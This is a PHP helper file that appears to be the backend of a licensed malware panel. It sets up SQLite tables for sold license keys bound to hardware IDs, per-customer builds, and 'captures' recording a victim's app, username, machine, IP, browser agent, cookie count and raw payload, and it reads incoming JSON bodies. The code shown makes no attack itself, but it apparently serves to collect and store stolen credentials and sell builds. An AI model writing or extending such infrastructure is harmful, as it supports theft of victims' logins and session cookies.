<?php
declare(strict_types=1);

function panel_conf(): array
{
    static $conf = null;
    if ($conf === null) {
        $path = dirname(__DIR__) . '/config.php';
        if (!is_file($path)) {
            panel_fault('panel is not configured - open setup.php');
        }
        $loaded = require $path;
        if (!is_array($loaded)) {
            panel_fault('config.php did not return an array');
        }
        $conf = $loaded;
    }
    return $conf;
}

function panel_fault(string $message): void
{
    if (PHP_SAPI !== 'cli' && !headers_sent()) {
        header('Content-Type: application/json; charset=utf-8');
        http_response_code(500);
    }
    echo json_encode(['ok' => false, 'error' => $message]);
    exit;
}

function db(): PDO
{
    static $pdo = null;
    if ($pdo !== null) {
        return $pdo;
    }

    $conf = panel_conf();
    $file = (string)$conf['db'];
    $dir = dirname($file);
    if (!is_dir($dir)) {
        @mkdir($dir, 0775, true);
    }
    if (!is_dir($dir) || !is_writable($dir)) {
        panel_fault('database directory is not writable: ' . $dir);
    }

    $pdo = new PDO('sqlite:' . $file);
    $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
    $pdo->setAttribute(PDO::ATTR_DEFAULT_FETCH_MODE, PDO::FETCH_ASSOC);
    $pdo->exec('PRAGMA journal_mode = WAL');
    $pdo->exec('PRAGMA foreign_keys = ON');
    $pdo->exec('PRAGMA busy_timeout = 4000');

    migrate($pdo);
    return $pdo;
}

function migrate(PDO $pdo): void
{
    $pdo->exec(
        'CREATE TABLE IF NOT EXISTS licenses (
            id       INTEGER PRIMARY KEY AUTOINCREMENT,
            lic_key  TEXT UNIQUE NOT NULL,
            plan     TEXT NOT NULL DEFAULT "standard",
            expires  TEXT,
            hwid     TEXT,
            active   INTEGER NOT NULL DEFAULT 1,
            note     TEXT NOT NULL DEFAULT "",
            created  TEXT NOT NULL
        )'
    );

    $pdo->exec(
        'CREATE TABLE IF NOT EXISTS builds (
            id      INTEGER PRIMARY KEY AUTOINCREMENT,
            hwid    TEXT,
            name    TEXT,
            file    TEXT,
            size    INTEGER,
            version TEXT,
            at      TEXT
        )'
    );

    $pdo->exec(
        'CREATE TABLE IF NOT EXISTS captures (
            id       INTEGER PRIMARY KEY AUTOINCREMENT,
            tag      TEXT,
            app      TEXT,
            suser    TEXT,
            machine  TEXT,
            ip       TEXT,
            agent    TEXT,
            cookies  INTEGER NOT NULL DEFAULT 0,
            at       TEXT,
            received TEXT,
            payload  TEXT
        )'
    );

    $pdo->exec(
        'CREATE TABLE IF NOT EXISTS settings (
            k TEXT PRIMARY KEY,
            v TEXT
        )'
    );

    $pdo->exec('CREATE INDEX IF NOT EXISTS idx_captures_at ON captures (at DESC)');
    $pdo->exec('CREATE INDEX IF NOT EXISTS idx_builds_at ON builds (at DESC)');
}

function setting(string $key, ?string $default = null): ?string
{
    $stmt = db()->prepare('SELECT v FROM settings WHERE k = ?');
    $stmt->execute([$key]);
    $value = $stmt->fetchColumn();
    return $value === false ? $default : (string)$value;
}

function put_setting(string $key, string $value): void
{
    $stmt = db()->prepare('INSERT INTO settings (k, v) VALUES (?, ?)
        ON CONFLICT(k) DO UPDATE SET v = excluded.v');
    $stmt->execute([$key, $value]);
}

function now_iso(): string
{
    return gmdate('Y-m-d H:i:s');
}

function client_ip(): string
{
    foreach (['HTTP_CF_CONNECTING_IP', 'HTTP_X_FORWARDED_FOR', 'REMOTE_ADDR'] as $key) {
        if (!empty($_SERVER[$key])) {
            $value = trim(explode(',', (string)$_SERVER[$key])[0]);
            if (filter_var($value, FILTER_VALIDATE_IP)) {
                return $value;
            }
        }
    }
    return '0.0.0.0';
}

function read_json_body(): array
{
    $conf = panel_conf();
    $limit = (int)($conf['max_body'] ?? 4194304);
    $raw = file_get_contents('php://input', false, null, 0, $limit + 1);
    if ($raw === false || $raw === '') {
        return [];
    }
    if (strlen($raw) > $limit) {
        panel_fault('body too large');
    }
    $data = json_decode($raw, true);
    return is_array($data) ? $data : [];
}

function json_out(array $payload, int $status = 200): void
{
    if (!headers_sent()) {
        header('Content-Type: application/json; charset=utf-8');
        header('Cache-Control: no-store');
        http_response_code($status);
    }
    echo json_encode($payload, JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE);
    exit;
}

function new_license_key(): string
{
    $alphabet = 'ABCDEFGHJKLMNPQRSTUVWXYZ23456789';
    $groups = [];
    for ($g = 0; $g < 4; $g++) {
        $chunk = '';
        for ($i = 0; $i < 5; $i++) {
            $chunk .= $alphabet[random_int(0, strlen($alphabet) - 1)];
        }
        $groups[] = $chunk;
    }
    return 'ROSE-' . implode('-', $groups);
}
